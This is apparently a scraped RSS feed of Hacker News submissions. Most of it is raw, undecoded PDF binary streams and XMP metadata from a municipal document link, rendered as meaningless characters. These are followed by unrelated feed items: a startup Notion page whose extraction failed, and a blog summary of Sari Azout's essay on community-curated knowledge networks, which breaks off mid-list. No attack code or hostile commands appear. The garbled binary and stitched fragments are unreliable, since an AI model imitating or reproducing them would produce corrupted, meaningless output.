f³¬|™Dë#[ðÁ	`V[$­öÓ7“DžÄÊxêwTRŸVZz¨Ëz¬§c¥s¨¸³Î²ƒ/ëv°&gt;¡.À‚ýž½‘ÞzZÒ.ºƒà-¼¶Ô¤~Mþh
PÁ–Û–ÒÃ*üa?PîJUæ4‚÷FxCGñ6]&lt;ÎççdÓtè’~ïdÀ›¥ˆi¾»ÞÐWº¸¬&lt;/¿ó�ÆHÿ	0™žkÍ
endstream
endobj
280 0 obj
&lt;&gt;stream
hÞÄ”ßNÂ0Æ_¥O`{úgl	Y¢(Ä#a»0!\ŒÙ�®d+	¾½§keh6À¼`§ëùÚ�ï—s�„ Br"ˆŠáL‘˜Æ„Œ€ŒÇtb*«+Û,b”/0‘øÈYˆ"Q„(CT.®è¤6›³[²+&lt;ˆ¿8&gt;G	&gt;WôA?¿ƒÙyQc
øéö“t¡³­KÝ´õ½›:Û¥v/m¸\·µ¤)½ÛÙYfëT³V%CfŠq3ÏÝfÔÍsw4kN@² ~z\¿éÒéï?œ&gt;ìcfaÜí„ÑÌÖÛÒúŠ|Ï‹uC3šn4úxÑiz@•„Z/Šæ�¦‡ÍA¿¹ëª2.+¼·o«ò¬þê‚ómãZˆNàG	pýDÀe|I\Á�†F�G^5kU}"“•b*=Šçµ)3m—t~;¥¹ÞYd1YÌ†‡›Üðpu²¿ÔqºAGÔEéBÜÑ•jˆ®]Ù÷§#yG7ˆ}#Ê®÷×ŸMÚ÷®'
£S¤ãÒ_í@£*
endstream
endobj
281 0 obj
&lt;&gt;stream
hÞ¤‘ÏjÃ0Æ_EO [JdYPíiƒFSØ!ä°u9”A:‚{ØÛOn…B/&gt;|þlýùYæ˜ Ç¤.
$L~”“«ïM`¨¶ç8×qµ
kà$Õ„Mï¶÷µûùžÂæ¸|NKxƒØuW3D�‹cx
Ïa;íË�U€X�˜½hÂœ
¨ÉHÂcèËrÚ—×÷ešhèO¥V~9Ì_—ëy&gt;–®»R¤?R°zc&nbsp;Ôb}icµÊ‚ÜÒFzŒ1ÔäÛTZý×TÔ0«
Çˆ¢
£�ÉŽ=Æù`çi
endstream
endobj
282 0 obj
&lt;&gt;stream
hÞìYYO1þ+~¯ÐúöZBH&nbsp;‚ŠSTT}XÈ¶¬
”l+ñï;ãµ�B
i+¨dE_s­ÇþÆ²™â„¦$aL•P„qÃ¡Â%t+J¸’Ð--áV*Â™ ’Qh1maHÉOI”¤ *
QŠ)¨(¢47P‘D
�ÏX´#9±Œ²¾^ªi=·]±9iª›â}{55í·â¼i7ÛiÛÃf2í¶®«	¡òo×Ó«Is×�'„s_r\ìWžƒ+Uœü¸ìîïêâtò£&gt;uüs–Î›Qw=ýlàû^“¸)	¥´£²´Dk˜3Ëˆ¢'èSÇí d~G‘tD‚~F!JhÉpîÈµ#°í)uýÎApÀñB¿“ó|QÎ×-ÝëÆþà’„…ƒºðc¢£`#u8ÖÑ Ç²Le&lt;9=”&gt;ÈAÝx™@BÀê¾Ä	ª·‡¥Óïõ0š8;ð+bEð“°âH1^^uÏuúNŒãðjCTEMÓèƒ`Þx¿Ðyß§`KÔ
4ZG]ø„™éZùÊHø1HsäœŽ‘M(�$÷Ñ+bžÐY“ò¤«Ì¯Œ§–-n…tUÌ/çgm˜˜…6‚^J¿ll¤(´³{~üñü�£ƒÓQ¦nGUÛáèñÐAM„¥½QÝvMw¿¶û€8ðG‹ÓñYÛS�häd"ÍZlí�{‹ìéì™eöÂ§­‚´Lf&nbsp;Í@›�6ííáÑ§ý�³w;ãîººŒÇßŸH‚?:ûI:IŒÙ�ôŽšÎ‚c)Aq`Ñ�Kåkö±€³²²6×â±Œ±¾,ñ�­Šƒ&amp;Ëüx©KüWž‹¢¥¯«Å^(ƒ€{Ê°¾´°\t“¹½(-à5Ó&nbsp;QûQI‘ð€J7¢J°/ÃÚ`|3Z5;û¿¦Ü¸ÒÈ™=áPY”-=DÐHÒîkÔâ};Ÿ@‡ƒþU³Cð;ú‘d‡°C‰ý¸’¬pÁ¥O?ÈÍO"çüMç�xxIã\Îd‡$«¬’‚‹!,Î^ß³³Cù‡Ù!	ü²ì0¿½�ì°ä°h~5¤²Ã£þ‡Õ6‡EÕÝ×m€›Ëª›«Ûz¶/gŽ¼ì©în}ó³îš«*‚8Ø£¾Ó„ãÏÓ”¯$òI9Ÿ”óIùuOÊÃ£ƒáÓW\¼üŠ€ËeW'›Ã“­O]Iúr{‚ýöJbm¯«nš«Ïžüÿ={fÀÍ€›÷
n¾!Í0”a(ÃÐ[€¡|—ïãò}\¾�{åû¸÷ZS.}­‘ìï¼Öh&amp;æÞkúWùÕ^lúÿ—¼ØP÷^CW}­�hü`ü­M
endstream
endobj
2 0 obj
&lt;&gt;stream
H‰„WÙnÛH}÷WÔË"`•YÜ5h4`Ç�e€&nbsp;3°Ðypú�E‹™(*Žÿ~ê.µ°$¥CæV·nÝåœsï–W7·ÃØµõj¿ývs;Žõj³nÄãÍr·ßÜÝí~ŠÇ"—‹"eRÈD"Ï3YU¢Ì¹P‰þêáø4¾í×âæãºnÖƒ¸YâÝ—ú¹ëë±Ûõâ÷ßïîß‰«›w±XD,ÄaÕ_Ý,—±PbÙ^Å2Žs±\‰9\éG¯B[žÇúKý¿ÔY&amp;±|¹zœ½‹*1ÛE‰˜½Dÿtð3ŽëH¥b¶Žô�ØE*‘JÌZ-äB¿ÝÐ[ñ5ÊÅl©˜­laí:ú{ùŸ«\ˆqwíÇ.›«™ˆ–ÿ»b¿|“DÆ}ó8{¿Žæz·§h®­
GüWã&amp;Ã[`;•E65�¤|Ÿ™­R»Õ–Ä2Wf§k&lt;^+´¾Œ'2û'¿çéBÌ•Lüêýí{yºkŠA�envU	q‹Uv²a9Ùpnwt�Ò	(�¡/š¹ý³æÄdÂò,?Ù 7äÁG�Óy…Y*ã‚­¤gŒþñÊó4ÁçwŸîõ+.Ù3•‰ñK8~�³%Ñ†ŠSrïŠ³‹”þí±&lt;ñi¯¿€ªÁÔ¨®L|Ý?Gº·fâK¹Æ…#Z}¡…âíGÚb&nbsp;GúÉsT@43~ÖðŽøX|ŠT	‹ðË�Þàz|0j'TÂŽ�“…Ö&gt;Zý•Üc+h&gt;ð�Ÿmíá^ÑvC§¢›^ÜÂë¶uÛ¢‰é™ÿŒÐMü†Ï‚Ù3•”–ÒÖO·ÃÒöÊ~b«úqöùØ;‡élûÚº«_ÁøÐèÖÞØÀC¸òŒ<vˆñä"céhà)þ\g*‡î„ë~Ãp7‚¬÷ ®drr:n‡k¦|="" ª½x7Ôÿ‚[ÿ&pûäeÐy×Ó1¸h¦ÙkîÙnýpÛÖfˆˆý˜ßckwØ�!pqéù¬õx­ý…ÂÆ·õ="" +ž¾¡×Ï4~(zg£lúádŸñáÞÓÂne‰íöôù¶ÃïØ8a4ºgëújëhaÐ¶ž[è9a;ÙlÞõéõ²}Ò¹w1Ç˜ct�~ôº8c`dàñ:ÐØ²k¼=",ÈšÝ%4ó‚}K®q\ÐÙ" ¬xÑ«cpÊ›@d��øŒ·^dôo="" k´åÛq&®!‘x¡Ì6èßÞó›lpÈñxô|û†="" Ó‚):ó="" üp´~|1´÷*²�eh™Œo¹¡˜rÂlx"="" €<–™å·{ê¯k]g�zsu¨mvvˆômg¨¥2×�“6¯Ñù){!¹+%so£Æˆ9$nèÓ[0ÑÎã¢b¦~ypg;Ä«cu‚8Ê»qcŒ„="‹$Ç)ƒã¯ñ" Ë="!" Œ aü¯<ÚbÄÅ¦3Ô_}'k»�¨+§¼zj\ªnr¼àª4äÿ†�="" lÌ\ab8”sÊ1Þuôï€zêk™æïx•�pryð%lg9òüxfs="" žâd}Ä²,oôÆz~l­æpfsÜ-a+'�›ô­e="" <iã¥È…Òâòìåœ6�°ëe,«ÅÄ‹_ï¢{ËŠn�åè&�«o:�pu�(ôc‘›.ÒÉ‰—z“j[dé_j;…vz�û™¾Ó…nÇj‰a}Õrx="" n‘%v‘�bß'Ãc^•2ohzx"�lpw®oe¢¼³¯Ä3yj¥&”Éw¨fË\zŸ‘È&f�ÊÂð€lãÑ§="" tºjå¡c(]bÍ•‹‘ý“gÆsgk,.æ‰[á="" i1)‹ˆ="" ä‚#v„ƒÁžØbÀrftû#ã�5?‹?18»wö@äkŠ²7Âwª˜‘6¬îuò(p%ès¸ì¼½¬¦àš(™ù�jj#æfÔnö¡7ude3£¡�“{"�ýq‹çÂ�yuÒé“�.¬Â‘zp©i¨èpiÔÓäñãìt@.Ýxa8¹cf¢5b0b­íi§Éµ°´äi›³¢ë‚ä¢:5%'½ƒ)’5®ûîdŠ)å"Ô*ïxÕùf="" 2"ù="" ùkm›b�="">XV£<q.¼Ñˆt0ü‰µ#®@n“ ‹�{nhs() ÎÀdú˜á·‚)dmªÃèw="" soxq,o…="" ¦•j‡q8Ç™q””="" ùoûpÑ¶®'’eƒz*s‹½Ó="" þk»ø4a“ºlé<´­­dkí7)é›jƒŠ×Œiü="" #—Ò¯õxa<l:«zœvãôŒf}¸^9åÜo^bý±hmæ"jÄÍ=""  +ÜÃî�-i¨gi3›ÝÌ‹xzøfëaéÆÍŒ<ï‰¿="" Œfàñ¬×®i‘+;Ôm)æy#Ë†Ä�£0"u²Êl¸_‘·[a&¥Îpg2•sjsyù©¥8µ^,|}É™x¼am¾Û¹="9ÏX³°Å¶3sÐ[„ÿÂq£’Y*QeÜQy¨D—$" !’Ém}¾ƒh.Í‰–lfm‡q?ð�4Çt‚ú<òt0Š×šè��æÁ~oßlÑyz£.mtýyc…i2½$¼`ûgú‡¨ñä5d¯`«vÐs®g¸$oí="">àôà†Ç›ÃT‘T`*tÇ$&lt;5Q"|×Â3�Œ&lt;+ÈêKþÀ}.¶X?€ov#:Õäáõ3ŸƒÏáø&gt;]Q­ŒsxýDÝc)†-I¯©}’ß«J|›�
o“k¨Ú¸À›BàÂ-îŒ—+â;ß
¢Óß"x~2àêþ:<qœzq|Žañ<±q"æòÁm�7Ž¤z‹a,j�†ú‘¢³$fÀgÓšqÐa—p€ËdæÄ¾yq¼q3�´~ayhÅcò“ÍhØ°ç½†@r€0³(cÂµÛ†kŸsàj£Á`û#›²úÌ8Äqe3‚_�Ïû,ab‚'Ìp‡§0®0 ( ”ô¦¶„ägÀh="" ›Â‰êôÁô¢ptºñ[’$qnmû7mÇ14´â½öÄ¤›¨j™å~Ÿ)t3]&i‚ Ý)©="">7_
žRrÊÈf,Y{OsÇÈÃF¡à&lt;™\”áy‚ásžj)ýX¿@ç¯ø}Fþíq]A€ßàç"Kf²´üö„Þw<p �…“ÈÌn§�kî­í="¬ækÜyÚÔ†~}Ù1Hà¢ýb1ÁS-†¯©CxžsñÄH·<Ïð­×ËÍ‘àÁŸ‘NdTë\0�ùô)�­Ô»6Ð‰¡JZ" Ùš°jŽÔ¤="" ™ÉÞ!¢b�ìm0="">^
Jc±$µÜQ¿ò\ƒû
î€DxQ—2·©¬7ñÔêT�°žg/²¦	R™¥4Sý Ñ‡xý«]zê�"
ôÕÂBÑjg¸›¾‚ë€°d\„	Ô�'süvß“Dª)N�'�lv
Rõ¥1+Å%yœ}´èñêê1@*ú)~£æ¤`œ)GU�SõÍŽ9ÝN½ƒž.šMœp²x®²*ü²³&gt;�,sÃ…‡nÔUàŠVÉn8o£�½È&gt;JZÊ##CÀiø
›¶IŸcêtûUöæÁÅ¯·&lt;�u:0}ÃjÞÐIkµ’ªŒÃGä¥ƒ3�(§0�¢÷ãïf%&lt;Îªxõ´uGo=Zž&lt;6±—êrô§è;§ yÙÜã	16ZàUánH&amp;sÕîæÓ–*
›:X×ôOÐÜ¤¶©§N:sq‘ˆ•!bÛë“³’Èaq7?á,¤q8µ½ÓPÝöb"ÍR\‰íäÔ&nbsp;h(‹o!Ó&amp;g˜6µ%$Á�†·
þ	ÿõŽ%’¤:ç§Éˆ›
^ãQP¼ÒX@`¹ÝRyéw‚‡È�@ÅŽ—°À˜h#Œ@—v=B§ôÏ"&gt;—E9å%«u[(+UH–$z�æeáŽÂÁªo€Á@¿cº¿ÿ�_J–P0sßÝê»J|€ßÁíqÏe!Øƒ–¤Åèùˆ×­N¹Œ&gt;w“fÖØ¡|IlP– °o;
/N,Nàðÿ¤WMsãD½çWLµªÂŠ&gt;m‰ÚÚ*’x!‡�›[NŽmŠc™~==ýzfZ’m&nbsp;¸$–4ÓÓÓï½6A°š&amp;Ô©CO@Ü~ìÉñá”C¥ÒEc(—9›*¿LÉöÃ;%rÌUà%´´}�®¤‘DôK°°çÀ
f?Ýå;÷7Üu=˜­d6ê&nbsp;Š}¨G´Ú)@Óé9Pñ6[dóŽrTÒcèÑxBÝ9¯ýr&lt;Ñ¹8&lt;0pî ›F
ÀôiYÌ´bjý¨’…(ùÚ
Ä'U-l:ŸÊBƒàüæÒœ�ß™÷ïÏo.¯¯La&gt;|¸¸¢wc,›`ó$ó÷ÿZ4öJ
€g±{Š¨-
Ãà
e²&lt;}Îõ”®­ÖK\tÏK±aÉõ*0)ºu»K~õUÜ³ü¼=ÖD­ê
Ç:DWJ]rß={”‰ûâ¶ÊW~¦êzå¢Î‹ËÚ­i°ä&nbsp;8t³Š9‡|2ŠœšY|¥_é&gt;?2µ„&lt;&nbsp;,Ÿ]s¹¶¼ouHÊÏÀ%$£!Or(YÃS^ÐJœ¹%·‘×øOÔ¼µÅŽ#âœ¾*q®öœÄu~ª€ËLyªuý^Û¢tÌ¼üIq®®kFFž×2N„íÙc¥UÆ…'ý1ÆYüoÐBR7¥È&nbsp; T©dŒ©0§{Æa€ç7h
ä1&gt;wŠ3±—ªíÂ›G­¸ì^Êw9.ô?É&nbsp;…:€è–wow^¯gái
µÆ÷ÓÊ7›‘tÔ´q÷&lt;`×ÜÆ
Aá»!,MXÈ¼gWœ÷­˜ËöjºÇ�€®¨^0{ÀJe€º¼qê²_~‰�Ì$x{ëÚÆ+;ÖuôfÑšë¸•Vqþ„D½ÛT�HšÎë©%o}&amp;l´÷
©Ürã
íeqáíÂ[®�eQÄ!ã¯°¹€ÉÝ
sÁØh*¾¼›�æ‚Dæ‚ÂcaØm&amp;µµ¯)ðo#`Šäv¥¥Ã!�†zªcú®êI·]Á,ÅÛ›Ê³O[5^uZä,*Cêi»ó®sMÂ³•žpÅ\zå-…ÆW
ÖÍ:ˆ§ETKÂß=&gt;ìw¾Sz+Óà°’=ä«zù‡ý8¢Ø6Ì�ZZ…«vák«tµÅ¤“—jØ¬PVÇ',WÉäãŠü�ØS(‚(
:üoz¤#L�Gßpf?$¼�f2b4»4koA*F�D€Q�¨n~vþcîénêèî‚Þßß§†bÕxÙ¡&amp;	ªé„Ä[Bñs–™Œú£¦`¾P«Æö²�Á‚&amp;ÜY™i7Â1žº'ž»Ó8­=ùÒ’È¢¢%±A SŒ¸”C!+û¼_-DÝCd�&gt;Sû±†&nbsp;ã5+=-HEòë·h“d)·èÈº¢³ö
&amp;ŒVU\…—rÌç¨´K	{S{š¹sS-»D&lt;@wò)íëæ{º}U¦Æ¼-7g3roJá,âÙÔ3$..¨\wOg
gdÊÌËX&nbsp;&nbsp;&amp;!¨}â°ÆyË8i	¹\Ø¤=¼ûSß³5_±.D&gt;7¸Cç3}ƒñ9Y&lt;õ’øŽ�î`ûåÈ&lt;)œ˜·@ø(œPo»hê~Ë€Ý�0æ­@DbÃŸq”™ÿþ‚ØRÂkíF€�úÔšoÝØÌ­o]Ù-d“´ªÛ	:�óš?"7C`OÛ&gt;ÙÒ©{ãÅÓ°ÿJK'¤fårx@ÃNòt@=·$Ž©¶~‰&amp;,ýqlÊWfš°¯Ç{ÊäÔ&amp;²ïO'õéÒ�ÒÐ{_Ôre/sœ��k^=g-ÚöOF»ŸCÈXønyWÖóÛõ#
IGš¶É3šÝ=h°*NNÆº&gt;kê»äÿÅºü±‰˜ìÀäàD
0wÇ€ÉìÚÂýJÀ¤°Qz§Á¢[»HÔó+ûe×—î,æ¡N˜š÷�QØœb9É×Ô|5‹"û¸CuÁ0g6kš5Ú$uìƒ�#¦"ÄX†±ó(¦n’
Ã‹=cL¼�é.—À€îÈþ!¾ó³é$€æ¾K‹&lt;äüF‰Ù‰#´—MÿíeÎùŠFW ­©½=³Òz'
‰äËÇ—ˆ´¶ôåIL%ÄÕR
9w/À=^#ß„½ºA$ëÀÁe®Þ¼Îÿ‰½Ò¼²¼¢Øë(y‘À?Å^…�M1¦¯”²1ƒæøéü{ö.&nbsp;€cúð·?oŒ�
endstream
endobj
4 0 obj
&lt;&gt;stream
H‰ÌWYoãF~×¯è§…ŒÚìæÁÚò8ãA¼ãDBöÁ›Z‡ÅŒD+•ÿû­®ê‹ÔaÏìËe6»ëê¯¾ªºš..›¶Z–³–ýøãÅeÛ–³ÕbÎ.¦Ï[öÇÅÕÕóWö�&amp;¼Hc–É”K‘²$‰yž³,Iy!$ìšìÛ—í‚]|X”óEÃ.¦øv_&gt;UuÙVÏ5ûé§«ë1\Œ'!›íXÈØnV.¦Ó�	6]B†	›ÎØHýK_H…°~3ø‹cž²éfð09&gt;’
7A¬•z´í".x°ç@H.ØpÉ‚‚ðuE_Ù¿ƒ„
W�µ”µ:»þ˜~„Ê„µƒ…úw&gt;²`úç@Ûå[(%cÚó0¼Y#ÐöŒ@Z³ÇŸ•4/=ÙOã®hé÷Ø¨Š¬ªB	y"Œ¦wèžJ/zÂ%�_³{l$¸”¸ëæò†j�0<kŒvqp·pÄ ³ŽÂ‘Õè�a÷:4#ým9s="" rj‰y–(hŒ‚„Âc"ø�w:ÊñÖ{ÊÃôŒÐ÷w�Ï÷�"•wãÛkø¬a{5upª±�sŒ²cb+þ«�="" +ÀÆð‚�©x›b^x£˜Þäi‘vkª="ˆ­—7U" °À•u \Î¸q•9Ï`uÍn)9="" ¼[½soi{‘iy–Šn,¦ ="">Àa’f &gt;ei¹³Þ õCç¬Y–7Ÿ{6aÂöíYžf€&amp;Ii&gt;U¹¹¢\F¤ãfì|¯ÿ#¥T˜Ü)ì�d‡çó
~•»-rî¯q©Þ1ÙÙŒ(”Òá–D``FUÃmIä‚’½ÏdzÄc›KTÔ&nbsp;tÔ††Uz4+Õ`V?BikqßÊíføÔt©+ÍÑ
ÑõƒmñkãLÃ�súhQë–kM}è…ÈHE¡ö‚ƒræ¸ð¢,`îÊî&nbsp;m�žá
ˆe–‡áÌ2õßA¦÷6Ö½9#;–¤ñÚPº2˜¾ÔÞºËÆàáâ.�Üƒ¤&lt;2TòlH®‡@€·Íª¥F[:çÈC
(Ù�ßöævÈBŒ2Ý.ù˜Ä�øÀóÛ–ÄðCc³~]�çÞ�q–&lt;ÉYŽMä)ÎJ�¨�~ˆVÈÈãä•Ry¹
†Ô¤x+Å\DV*}šÍvA¦jöžÞÖ-¼ÂžRý*tx›S( Ïr_…X½®zñÍ¹,^ç9ó(õyNœ$ºè,ÑÙá¹ÄÇèÉŠ
â…˜ÿgïˆ\¡Ò¨‹¦Btµ¸�žï€è» �áòBnª
r¬Â}ù	q|$Cü=PyNÆÖÉÃÔÑé‘´ÿ›Bù¾%Rc÷–1'j—`:Ü»6dÝôH¯Ob–%nœ´²'“ý#Æ#SÅ¢çgÜkSú~&amp;gýÄÓžŸ­½u­YL³š|gíWÎá´vïüŽÍæŽ×Â�àØŒ*6ºä4-ÿ¦]W:vA¢î\3ÑžÏ öyg×	t¯òIz”OF6ÃÏòI"
ì€nOv@obŽÂt´ªyŒÉ?ä…GÊÿµN|Í$�=’ç–Jž(2¥þ]Àj†�]
¾é^ªßeÀÅkŒ‘@ÙËã·1Föý­Q\„ª–o�4r¶•½ñ~t§¡û*MêOºŽ@©Vaëú:ÍV%Õ5,¿5)lIý£.”Øæ0”O|üÓËk¡ ®mAé¦Ø"Mèk›ßäÆ]¯·®©õ�¢¬¿T™/¡P&amp;½A‹¾w¯uA©½®Ng_·qB­llSŒ³mHÞAÈxd[�E€¦ï0ÀÞ„FX«ˆÅW†Ë‘ñJŠö=ŽN{e˜6#‚u5CWïô¡Âœ$YT:¨¶&lt;ù
Ÿ•å
¾G†Á
4Á‰·t©¸¶Ä'�Ù”¾èg4I¯q`l¨½bÕh‡õoCöýEXAIôeŽ/Ük+1jÞÕ|&nbsp;è�pH�§~©–UÞ±’xÑ=¿=¶Ùó0zdàmÃ0•ÍüDüL-ÆótUÕÎ}ÑB¶Ê<rÙ´˜u¸gå–Éõõ?>ºÛ£��;ÞTm§Æ«ƒ©…Ð¦Ç&nbsp;…‘ƒ÷eÎÓÌàqìÂCpk*r¸d?+[ª5éDÃtç1ÅíÞUhXô�æ³³’Šî/UýÙRbn(ñb&lt;l¶SæAUâ’i–dÄ”]~DÿFd¿‡ŒÖŸ1³Ý0…Iü?ýS³ýŠ‹Ø`O/;qUÔ­7ÖHm&lt;È4o”Î)U6'Û²¶~~áOBtMûâJ°£xÅ¼€Æ3N96†C®[þ¤W€ÎÇIUŠ8æ2f"•J 6š®ùµü;iã7Ï±Èx†õiøñd¹‡‚Yä§gÑ+€<j <="" ÷’Ç¦fã¦Ì 9£Ý²°}b="" À§–�è#Çb="" r¥l·ÄŸ®ë1Ð{šŸ«ë¿\="Ï_\4Ï�‘õíÈ<å€Èƒ'Lð¢Ãàei/vgšîš¦kÄóÆuÎ„f\Õ­äï�t­5åµß'´®o\ïZ·ÝvTqdª;UÌº¹Îž'Í·ð[�jTçuÎµWäÁ(!µ™Ö$A6u²úo•�®šS_„{Öº3ðxaîs±õ%ö@K¿Mñ#p‚=©]ˆ(ÄŸ‚¨[îÊ†ÔÝ½s5ŽvPi­¶´qM�.§fxóii¾<$þOdpì*Qñ£«Š" “*$×ß©Æˆ\¦…ŸŸù‘é="" ;˜z˜Ïü©©ñ‘jÇÏcù�ÐîÆ½ƒlÝ‘`q×õÊv$‚@¦"usù«="" ÓÀ_¤?ø1m4•jÆè&¨p£Ðß½zwª³šhiØ�ÐmÓ="" ‰¸öz…ëûÖ oÐxŸÛv="" ­Ýh°Ì(iˆu‹0ûäujƒ^wfú©cÜs±="">ÆÊ÷«[ñ	‰J—Å¢í×\’8.K¤É’D–¯"ùˆ?‹Ã¯l”Ñ;tƒ�fÓP&nbsp;!}pf<l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mŠh2Ú¯‰l 81="" ½èibÓéÀ”u¶lóµ-5ów="?¤býs~ß�n€iÊ�«™<ìàN6o]ý" ”Äsêåõê¬w·gza7="" ¸v°«?æi|Ö€èŒxØób}xék¯“ØŸ*Ó¼ÛnÂhz="">"ñÙˆ¤²;CöÒ°¡ú†¡YÞ/Ì€Å.©Pá²1
(zš*='*Ï;*
K‚¥ÍoMg˜e=–�¡¯9ëprÆa:
}™¹‚
?¶1üÛxDÂªÚÙ¥wR(Ì0©K¦¡`3Çáb¨µ'¯DfÒ²½ñNO!­¡LÿúÞ'&lt;ŽÎzŸžóO{÷ý¦üöé©gs¨ôÖe¦’ÿÃPEòÿO‡*ù�S•i2yóUjlòF¨~ïï0…^°;½Öõç�¨éOD�ÓžKF4ýJà¹AlRô	žd9NåX•&gt;]›"ª­°€ø«®Ë˜¶¸R#4wúªVëÓ�ìÁUFò¤ÁÊêznª§}³p!��'*Ä“ñ¿@_Â¾°œÝ±Á_L9¦ºÆîN%«L�=a³Í@}ØD]¢n`=˜~Õ™Ó×ekž“w%
ðHäÅ+Òþ+Àš—¸
endstream
endobj
9 0 obj
&lt;&gt;stream
<!--?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?-->
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c015 84.159810, 2016/09/10-02:41:30        ">
   <rdf:rdf xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpmm="http://ns.adobe.com/xap/1.0/mm/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:pdf="http://ns.adobe.com/pdf/1.3/" xmlns:pdfx="http://ns.adobe.com/pdfx/1.3/">
         <xmp:modifydate>2019-01-18T13:13:43-05:00</xmp:modifydate>
         <xmp:createdate>2019-01-18T13:11:18-05:00</xmp:createdate>
         <xmp:metadatadate>2019-01-18T13:13:43-05:00</xmp:metadatadate>
         <xmp:creatortool>Acrobat PDFMaker 15 for Word</xmp:creatortool>
         <xmpmm:documentid>uuid:94187431-f8c4-40b7-bdb3-fa92848afafd</xmpmm:documentid>
         <xmpmm:instanceid>uuid:96c8373f-a802-…</xmpmm:instanceid></rdf:description></rdf:rdf></x:xmpmeta></l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mšh2ú¯‰l></j></rù´˜u¸gå–éõõ?></kœvqp·pä></p></qœzq|žañ<±q"æòám�7ž¤z‹a,j�†ú‘¢³$fàgóšqða—p€ëdæä¾yq¼q3�´~ayhåcò“íhø°ç½†@r€0³(câµû†kÿsàj£á`û#›²úì8äqe3‚_�ïû,ab‚'ìp‡§0®0 (></q.¼ñˆt0ü‰µ#®@n“ ‹�{nhs()></vˆñä"céhà)þ\g*‡î„ë~ãp7‚¬÷></l¶šµò­·¯uá*~ˆóx!"ö></ejò‚èôùæ�ìc÷§q></sœx‚zc)v:&è\´;{âdéç)jq(f"¯”èƒã³†ä1¤ˆïyôç°òˆ8l9ù&»�_ÿœããâ²^žòþåñçeœôcnø£¤˜†w%nõiºd\ÿ�ç;¬€o6:ê]-></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</a></em></p>]]>
            </description>
            <link>https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077762</guid>
            <pubDate>Fri, 13 Nov 2020 01:28:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealth edtech startup just raised a $4.3M seed – here's their Notion page]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077615">thread link</a>) | @jcs87
<br/>
November 12, 2020 | https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077615</guid>
            <pubDate>Fri, 13 Nov 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Knowledge Economy: The Rise of Community-Curated Knowledge Networks]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076142">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/ | <a href="https://web.archive.org/web/*/https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-920">
				<!--<a href="https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              											<p>																Wealth								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>The Knowledge Economy</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="337" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png" alt="" loading="lazy" srcset="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png 1024w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-300x158.png 300w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-768x404.png 768w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1536x808.png 1536w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth.png 1900w" sizes="(max-width: 640px) 100vw, 640px"></p><div>

																					<div>
								<p><a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
									[Image source: Check your Pulse #55 / Sari Azout]								</a></p><h5>
									<a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
										The rise of community-curated knowledge networks									</a>
									 &nbsp;by Sari Azout / Check your Pulse									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>This piece of content is all about the future of/how to think about online communities at the intersection of content curation and knowledge management&nbsp; 🤯 … *strap in*</span></li>
<li><span>“At least 2.5 quintillion bytes of information are produced every day, which is approximately what was produced during all of 2002. While this presents enormous opportunities, our brains are not equipped to deal with this abundance.” — Sari Azout</span></li>
<li><span>“We seem to have forgotten that the goal is not to consume more information. The goal is to think better, so we can achieve our goals.” — Sari Azout</span></li>
<li><span>“There’s a whole economy around knowledge organization available for the taking…&nbsp;</span>
<ul>
<li><span>Three intersecting problems remain unsolved:&nbsp;</span></li>
</ul>
</li>
</ul>
<ol>
<li>
<ol>
<li>
<ol>
<li><span>Our feed-based information architecture is obsessed with the present.</span></li>
<li><span>We consume information recreationally, not as a way to achieve our goals.</span></li>
<li><span>Curation has been too focused on the information and not enough on architecture; how we collect, store, augment, and utilize what’s already in our minds.” — Sari Azout</span></li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>
<li><span>“Without an information architecture that supports a longer shelf life for content, we will continue to accumulate mental and behavioral debt.” — Sari Azout</span></li>
